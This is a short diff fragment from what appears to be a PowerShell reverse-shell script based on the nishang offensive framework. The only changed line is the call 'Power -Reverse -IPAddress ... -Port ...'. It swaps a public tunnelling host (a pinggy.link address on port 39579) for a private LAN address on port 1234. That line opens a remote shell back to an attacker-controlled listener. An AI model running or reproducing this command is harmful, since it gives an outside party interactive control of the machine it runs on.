@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Power -Reverse -IPAddress rners-115-187-63-71.a.free.pinggy.link -Port 39579
+Power -Reverse -IPAddress 192.168.20.129 -Port 1234
